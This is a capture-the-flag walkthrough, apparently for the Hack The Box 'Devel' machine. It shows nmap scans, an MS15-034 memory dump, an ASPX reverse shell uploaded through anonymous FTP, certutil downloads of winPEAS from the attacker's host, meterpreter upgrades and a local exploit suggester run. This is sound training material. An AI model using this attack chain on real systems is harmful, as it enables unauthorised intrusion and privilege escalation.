# Summary
### 1. Another Day, Another NMAP
We find FTP & HTTP (IIS Server) ports running on the system. Vuln scan shows a vulnerability `MS15-034`.

### 2. First Attack, MS15-034, CVE-2015-1635
We find a Metasploit module, `ms15_034_http_sys_memory_dump` and used it, but the result did not contain much valuable information.

### 3. NMAP, Second Attempt
We perform another NMAP scan looking for more information, even version numbers. We also probe the HTTP server based on files we saw from the FTP server, `http://10.10.10.5/iisstart.htm` etc which worked.

### 4. Finding Vulnerabilties for FTP & IIS
Our NMAP scan revealed `Anonymous FTP login allowed (FTP code 230)` on Port 21, and with a metasploit auxilary scanner we see that everybody has read/write permissions. We can upload a reverse shell that's supported by IIS.

### 5. Reverse Shell Execution
We try uploading and executing various reverse shells, first in PHP which failed to execute, then a ASPX reverse shell. We are able to execute the ASPX reverse shell and get a connection on our Kali machine.

### 6. Privilege Escalation Failed Attempts
This part was a headache, you can ignore this section. I basically tried elevating the regular shell into something more powerful, like meterpreter or simply perform privilege exections which failed. We also upload `winPEAS` tool to enumerate the system to find for weak spots for privilege escalation. Although `winPEAS` tool was successfully ran, I failed to find something to work from.

### 7. Fixing Errors and Getting Meterpreter for Privilege Escalation!
It was at this time I realised I had made configuration errors, my metasploit `exploit/multi/handler` was configured wrongly and the handler could not identify that it was a windows shell, and instead classified it as a generic shell.

Fixing the `exploit/multi/handler` with the correct `windows/shell/reverse_tcp` payload, we get a positive identification on the shell and finally able to convert this shell into a meterpreter shell through a metasploit module which we tried earlier, `post/multi/manage/shell_to_meterpreter`.

### 8. Privilege Escalation
Upon getting a meterpreter shell, we try `getsystem` which failed. We run a `post/multi/recon/local_exploit_suggester`, and tried one of the exploits, `exploit/windows/local/ms10_015_kitrap0d`. 

Exploit `exploit/windows/local/ms10_015_kitrap0d` worked, and we got another meterpreter shell with `AUTHORITY\SYSTEM` elevated permissions without changing directory to `%temp%`. Next, there was a bug when doing `ls` on the directory with meterpreter, and we had to downgrade to a regular shell in order to get both flags.

### 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
This is a slightly shorter and alternative method of #5, where we can use msfvenom to construct a ASPX meterpreter reverse shell, and upon executing this payload on the target, we immediately get a meterpreter shell.

The guide recommended navigating to `%emp%` directory when performing privilege escalation with `exploit/windows/local/ms10_015_kitrap0d.` This was best explained by the official write up: "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."

# Attack
## 1. Another Day, Another NMAP
```
hippoeug@kali:~$ nmap --script vuln 10.129.123.159 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 15:04 +08
...
Scanning 10.129.123.159 [1000 ports]
Discovered open port 21/tcp on 10.129.123.159
Discovered open port 80/tcp on 10.129.123.159
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_sslv2-drown: 
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
|     Disclosure date: 2015-04-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
So we know there is a FTP server, and a HTTP server running IIS. Let's KIV.

## 2. First Attack, MS15-034, CVE-2015-1635
Ezgame, another metasploit module!
```
hippoeug@kali:~$ msfconsole
msf6 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > show options

Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------                                                                                                           
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             80               yes       The target port (TCP)
   SSL               false            no        Negotiate SSL/TLS for outgoing connections
   SUPPRESS_REQUEST  true             yes       Suppress output of the requested resource
   TARGETURI         /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)
   THREADS           1                yes       The number of concurrent threads (max one per host)
   VHOST                              no        HTTP server virtual host

msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > set rhost 10.129.128.62
rhost => 10.129.128.62
msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > run
/usr/share/metasploit-framework/modules/auxiliary/scanner/http/ms15_034_http_sys_memory_dump.rb:67: warning: URI.escape is obsolete

[+] Target may be vulnerable...
[+] Stand by...
[-] Memory dump start position not found, dumping all data instead

[+] Memory contents:
48 54 54 50 2f 31 2e 31 20 32 30 36 20 50 61 72    |HTTP/1.1 206 Par|
74 69 61 6c 20 43 6f 6e 74 65 6e 74 0d 0a 43 6f    |tial Content..Co|
6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74    |ntent-Type: text|
2f 68 74 6d 6c 0d 0a 4c 61 73 74 2d 4d 6f 64 69    |/html..Last-Modi|
66 69 65 64 3a 20 46 72 69 2c 20 31 37 20 4d 61    |fied: Fri, 17 Ma|
72 20 32 30 31 37 20 31 34 3a 33 37 3a 33 30 20    |r 2017 14:37:30 |
47 4d 54 0d 0a 41 63 63 65 70 74 2d 52 61 6e 67    |GMT..Accept-Rang|
65 73 3a 20 62 79 74 65 73 0d 0a 45 54 61 67 3a    |es: bytes..ETag:|
20 22 33 37 62 35 65 64 31 32 63 39 66 64 32 31    | "37b5ed12c9fd21|
3a 30 22 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |:0"..Server: Mic|
72 6f 73 6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a    |rosoft-IIS/7.5..|
58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 41 53    |X-Powered-By: AS|
50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 53 75 6e    |P.NET..Date: Sun|
2c 20 31 31 20 41 70 72 20 32 30 32 31 20 31 30    |, 11 Apr 2021 10|
3a 30 31 3a 30 39 20 47 4d 54 0d 0a 43 6f 6e 74    |:01:09 GMT..Cont|
65 6e 74 2d 4c 65 6e 67 74 68 3a 20 36 38 38 0d    |ent-Length: 688.|
0a 43 6f 6e 74 65 6e 74 2d 52 61 6e 67 65 3a 20    |.Content-Range: |
62 79 74 65 73 20 31 2d 36 38 38 2f 36 38 39 0d    |bytes 1-688/689.|
0a 0d 0a 21 44 4f 43 54 59 50 45 20 68 74 6d 6c    |...!DOCTYPE html|
20 50 55 42 4c 49 43 20 22 2d 2f 2f 57 33 43 2f    | PUBLIC "-//W3C/|
2f 44 54 44 20 58 48 54 4d 4c 20 31 2e 30 20 53    |/DTD XHTML 1.0 S|
74 72 69 63 74 2f 2f 45 4e 22 20 22 68 74 74 70    |trict//EN" "http|
3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f 54 52    |://www.w3.org/TR|
2f 78 68 74 6d 6c 31 2f 44 54 44 2f 78 68 74 6d    |/xhtml1/DTD/xhtm|
6c 31 2d 73 74 72 69 63 74 2e 64 74 64 22 3e 0d    |l1-strict.dtd">.|
0a 3c 68 74 6d 6c 20 78 6d 6c 6e 73 3d 22 68 74    |.<html xmlns="ht|
74 70 3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f    |tp://www.w3.org/|
31 39 39 39 2f 78 68 74 6d 6c 22 3e 0d 0a 3c 68    |1999/xhtml">..<h|
65 61 64 3e 0d 0a 3c 6d 65 74 61 20 68 74 74 70    |ead>..<meta http|
2d 65 71 75 69 76 3d 22 43 6f 6e 74 65 6e 74 2d    |-equiv="Content-|
54 79 70 65 22 20 63 6f 6e 74 65 6e 74 3d 22 74    |Type" content="t|
65 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65    |ext/html; charse|
74 3d 69 73 6f 2d 38 38 35 39 2d 31 22 20 2f 3e    |t=iso-8859-1" />|
0d 0a 3c 74 69 74 6c 65 3e 49 49 53 37 3c 2f 74    |..<title>IIS7</t|
69 74 6c 65 3e 0d 0a 3c 73 74 79 6c 65 20 74 79    |itle>..<style ty|
70 65 3d 22 74 65 78 74 2f 63 73 73 22 3e 0d 0a    |pe="text/css">..|
3c 21 2d 2d 0d 0a 62 6f 64 79 20 7b 0d 0a 09 63    |<!--..body {...c|
6f 6c 6f 72 3a 23 30 30 30 30 30 30 3b 0d 0a 09    |olor:#000000;...|
62 61 63 6b 67 72 6f 75 6e 64 2d 63 6f 6c 6f 72    |background-color|
3a 23 42 33 42 33 42 33 3b 0d 0a 09 6d 61 72 67    |:#B3B3B3;...marg|
69 6e 3a 30 3b 0d 0a 7d 0d 0a 0d 0a 23 63 6f 6e    |in:0;..}....#con|
74 61 69 6e 65 72 20 7b 0d 0a 09 6d 61 72 67 69    |tainer {...margi|
6e 2d 6c 65 66 74 3a 61 75 74 6f 3b 0d 0a 09 6d    |n-left:auto;...m|
61 72 67 69 6e 2d 72 69 67 68 74 3a 61 75 74 6f    |argin-right:auto|
3b 0d 0a 09 74 65 78 74 2d 61 6c 69 67 6e 3a 63    |;...text-align:c|
65 6e 74 65 72 3b 0d 0a 09 7d 0d 0a 0d 0a 61 20    |enter;...}....a |
69 6d 67 20 7b 0d 0a 09 62 6f 72 64 65 72 3a 6e    |img {...border:n|
6f 6e 65 3b 0d 0a 7d 0d 0a 0d 0a 2d 2d 3e 0d 0a    |one;..}....-->..|
3c 2f 73 74 79 6c 65 3e 0d 0a 3c 2f 68 65 61 64    |</style>..</head|
3e 0d 0a 3c 62 6f 64 79 3e 0d 0a 3c 64 69 76 20    |>..<body>..<div |
69 64 3d 22 63 6f 6e 74 61 69 6e 65 72 22 3e 0d    |id="container">.|
0a 3c 61 20 68 72 65 66 3d 22 68 74 74 70 3a 2f    |.<a href="http:/|
2f 67 6f 2e 6d 69 63 72 6f 73 6f 66 74 2e 63 6f    |/go.microsoft.co|
6d 2f 66 77 6c 69 6e 6b 2f 3f 6c 69 6e 6b 69 64    |m/fwlink/?linkid|
3d 36 36 31 33 38 26 61 6d 70 3b 63 6c 63 69 64    |=66138&amp;clcid|
3d 30 78 34 30 39 22 3e 3c 69 6d 67 20 73 72 63    |=0x409"><img src|
3d 22 77 65 6c 63 6f 6d 65 2e 70 6e 67 22 20 61    |="welcome.png" a|
6c 74 3d 22 49 49 53 37 22 20 77 69 64 74 68 3d    |lt="IIS7" width=|
22 35 37 31 22 20 68 65 69 67 68 74 3d 22 34 31    |"571" height="41|
31 22 20 2f 3e 3c 2f 61 3e 0d 0a 3c 2f 64 69 76    |1" /></a>..</div|
3e 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74    |>..</body>..</ht|
6d 6c 3e                                           |ml>|


[+] Memory dump saved to /home/hippoeug/.msf4/loot/20210411175954_default_10.129.128.62_iis.ms15034_109815.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Ah crap, nothing interesting mang. Back to searching for vulnerabilties.

## 3. NMAP, Second Attempt
```
hippoeug@kali:~$ nmap  10.129.123.159 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 15:23 +08
...
Scanning 10.129.123.159 [1000 ports]
Discovered open port 80/tcp on 10.129.123.159
Discovered open port 21/tcp on 10.129.123.159
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
Going to `http://10.10.10.5`, we see the IIS welcome page.

![1](https://user-images.githubusercontent.com/21957042/114300393-b8e96a00-9af2-11eb-852b-8fb586d1ae01.png)

Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 

![2](https://user-images.githubusercontent.com/21957042/114300395-ba1a9700-9af2-11eb-98b7-3c415045068b.png)
![3](https://user-images.githubusercontent.com/21957042/114300398-bab32d80-9af2-11eb-8831-c14e7a90f0ee.png)

So they're indeed connected and linked! FTP could be a good vector to attack from! Let's check the FTP out.

## 4. Finding Vulnerabilties for FTP & IIS
We see FTP on Port 21 has `Anonymous FTP login allowed (FTP code 230)`
```
hippoeug@kali:~$ msfconsole
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > show options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/ftp/anonymous) > set rhost 10.129.128.62
rhost => 10.129.128.62
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 10.129.128.62:21      - 10.129.128.62:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[*] 10.129.128.62:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a f*\*ken reverse shell!
But what reverse shell? 

Doing some research ([Source](https://www.atlantic.net/what-is-an-iis-server/)), we see:
"Because IIS uses C# and .NET web application frameworks like ASP.NET MVC and Entity Framework; additionally, it integrates with Visual Studio, all of which make it a popular choice for enterprises. Other key advantages are native .NET, ASPX and PHP support for modules and scripts, which allows web developers to create eye-catching, seamlessly designed content to their web creations."

Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported. 

## 5. Reverse Shell Execution
We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell. 
Upload to FTP [source](https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/).

PHP reverse shell [source](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
```
hippoeug@kali:~$ ftp 10.129.135.184
Connected to 10.129.135.184.
220 Microsoft FTP Service
Name (10.129.135.184:hippoeug): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: [Enter]
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5676 bytes sent in 0.00 secs (27.2013 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
04-25-21  05:03PM                 5676 shell.php
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```
Navigating to `http://10.129.135.184/shell.php`, we couldn't run the PHP file and did not get a connection.

![Screenshot_2021-04-25_22-05-27](https://user-images.githubusercontent.com/21957042/116108181-3feb3480-a6e6-11eb-8e2e-2e0b96522660.png)

Let's try ASPX. We find a ASPX reverse shell online, [source](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) and used it!
```
hippoeug@kali:~$ ftp 10.129.135.184
Connected to 10.129.135.184.
220 Microsoft FTP Service
Name (10.129.135.184:hippoeug): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: [Enter]
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
15855 bytes sent in 0.00 secs (55.5901 MB/s)
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
04-25-21  05:07PM                15855 shell.aspx
04-25-21  05:03PM                 5676 shell.php
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```
Run it by navigating to `http://10.129.135.184/shell.aspx`.

We also have netcat listening.
```
hippoeug@kali:~$ nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.10.x.x] from (UNKNOWN) [10.129.135.184] 49157
Spawn Shell...
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

Alternatively, we can also use `exploit/multi/handler`.

NOTE: WRONG DEFAULT PAYLOAD `generic/shell_reverse_tcp` USED HERE.
```
hippoeug@kali:~$ msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options
...
msf6 exploit(multi/handler) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(multi/handler) > set lport 4545
lport => 4545
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.x.x:4545 
[*] Command shell session 1 opened (10.10.x.x:4545 -> 10.129.135.184:49158) at 2021-04-25 22:09:45 +0800

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

## 6. Privilege Escalation Failed Attempts
Let's try somethings with metasploit. First, `post/multi/manage/shell_to_meterpreter`.
```
c:\windows\system32\inetsrv>background

Background session 1? [y/N]  y
msf6 exploit(multi/handler) > back
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options
...
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type             Information     Connection
  --  ----  ----             -----------     ----------
  1         shell sparc/bsd  Spawn Shell...  10.10.x.x:4545 -> 10.129.135.184:49158 (10.129.135.184)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[-] Shells on the target platform, bsd, cannot be upgraded to Meterpreter at this time.
[*] Post module execution completed
```
Nope.

What about `exploit/windows/local/bypassuac`?
```
msf6 > use exploit/windows/local/bypassuac
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac) > show options
...
msf6 exploit(windows/local/bypassuac) > sessions -l

Active sessions
===============

  Id  Name  Type             Information     Connection
  --  ----  ----             -----------     ----------
  1         shell sparc/bsd  Spawn Shell...  10.10.x.x:4545 -> 10.129.135.184:49158 (10.129.135.184)

msf6 exploit(windows/local/bypassuac) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(windows/local/bypassuac) > set lport 4433
lport => 4433
msf6 exploit(windows/local/bypassuac) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.10.x.x:4433 
[-] Exploit aborted due to failure: none: Already in elevated state
[*] Exploit completed, but no session was created.
```
Nope, didn't work.

Enumerating with regular shell, we know it's Windows 7 in x86.
```
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
...
System Type:               X86-based PC
```

Maybe we can use [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) to enumerate the system.

Let's also move to the temp folder where we have write permissions. We also host the winPEAS file using `python -m SimpleHTTPServer 8000`.
We also used certutil.exe because there wasn't wget, curl etc.
```
c:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEASx86.exe" winpeas.exe
certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEASx86.exe" winpeas.exe
****  Online  ****
  000000  ...
  073400
CertUtil: -URLCache command completed successfully.
```
Though we managed to get winPEAS.exe in, we couldn't run it. Let's try the winPEAS.bat instead.
```
c:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEAS.bat" winPEAS.bat
certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEAS.bat" winPEAS.bat
****  Online  ****
  0000  ...
  8923
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>winPEAS.bat
winPEAS.bat

            ((,.,/((((((((((((((((((((/,  */
                                                                                                                                                                      
 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS                                                                                                                  
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                
C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                                                                        
                                                                                                                                                                      
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                            
                                                                                                                                                                      
C:\Windows\ehome\ehRecvr.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
C:\Windows\ehome\ehsched.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)                                                                 
                                                                                                                                                                      
C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\infocard.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                                                                      
C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                
                                                                                                                                                                      
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                             
                                                                                                                                                                      
C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(I)(F)                                                                    
                                                                                                                                                                      
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)                                                                                       
                                                                                                                                                                      
C:\Program Files\Windows Media Player\wmpnetwk.exe NT SERVICE\TrustedInstaller:(F)                                                                                    
                                                                                                                                                                      
                                                                                                                                                                      
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                                                                     
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                
                                                                                                                                                                      
 [+] UNQUOTED SERVICE PATHS                                                                                                                                           
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                           
   [i] The permissions are also checked and filtered using icacls                                                                                                     
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                
aspnet_state                                                                                                                                                          
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe                                                                                                       
C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                                                                        
                                                                                                                                                                      
clr_optimization_v2.0.50727_32                                                                                                                                        
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe                                                                                                           
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                            
                                                                                                                                                                      
ehRecvr                                                                                                                                                               
 C:\Windows\ehome\ehRecvr.exe                                                                                                                                         
C:\Windows\ehome\ehRecvr.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
ehSched                                                                                                                                                               
 C:\Windows\ehome\ehsched.exe                                                                                                                                         
C:\Windows\ehome\ehsched.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
FontCache3.0.0.0                                                                                                                                                      
 C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe                                                                                                
C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)                                                                 
                                                                                                                                                                      
TrustedInstaller                                                                                                                                                      
 C:\Windows\servicing\TrustedInstaller.exe                                                                                                                            
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                             
                                                                                                                                                                      
                                                                                                                                                                      
[*] DLL HIJACKING in PATHenv variable                                                                                                                                 
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations                                                              
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                                                                       
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking                                                                           
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                                                                                   
...
```
We don't find anything interesting we can use, or know how to use unfortunately.

## 7. Fixing Errors and Getting Meterpreter for Privilege Escalation!
After some digging around, we found out it probably didn't work because of our shell type, indicated as `shell sparc/bsd` under sessions.
```
msf6 > sessions -l

Active sessions
===============

  Id  Name  Type             Information     Connection
  --  ----  ----             -----------     ----------
  1         shell sparc/bsd  Spawn Shell...  10.10.x.x:4545 -> 10.129.135.184:49158 (10.129.135.184)
```
This was a big newbie error.

The reason why `msf5 > use post/multi/manage/shell_to_meterpreter` failed previously was because default payload `generic/shell_reverse_tcp` for `exploit/multi/handler` was used instead of `windows/shell/reverse_tcp`.

Let's fix this by setting the correct payload in the multi handler and run our original payload `shell.aspx`.
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > show options
...
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.x.x:4545 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.129.135.184
[*] Command shell session 2 opened (10.10.x.x:4545 -> 10.129.135.184:49159) at 2021-04-25 22:20:15 +0800
...
c:\windows\system32\inetsrv>
```
We get a proper session type this time that shows `shell x86/windows` instead of `shell sparc/bsd`.
```
msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  2         shell x86/windows  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.129.135.184:49159 (10.129.135.184)
```

This time, we could actually run `post/multi/manage/shell_to_meterpreter` without errors!
```
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options
...
msf6 post(multi/manage/shell_to_meterpreter) > set session 2
session => 2
msf6 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.x.x:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (175174 bytes) to 10.129.135.184
[*] Meterpreter session 3 opened (10.10.x.x:4433 -> 10.129.135.184:49160) at 2021-04-25 22:24:04 +0800
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  2         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.129.135.184:49159 (10.129.135.184)
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL                                                           10.10.x.x:4433 -> 10.129.135.184:49160 (10.129.135.184)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > 
```
Heck yeah! We got a meterpreter shell!

## 8. Privilege Escalation
```
meterpreter > getuid
Server username: IIS APPPOOL\Web

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
```
Ah shit, getsystem didn't work.

It's time to to do some research! [Research source, under Post Modules](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html).
We also see a [Rapid 7 guide on `local_exploit_suggester`](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/). 
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.129.135.184 - Collecting local exploits for x86/windows...
[*] 10.129.135.184 - 37 exploit checks are being tried...
[+] 10.129.135.184 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.129.135.184 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
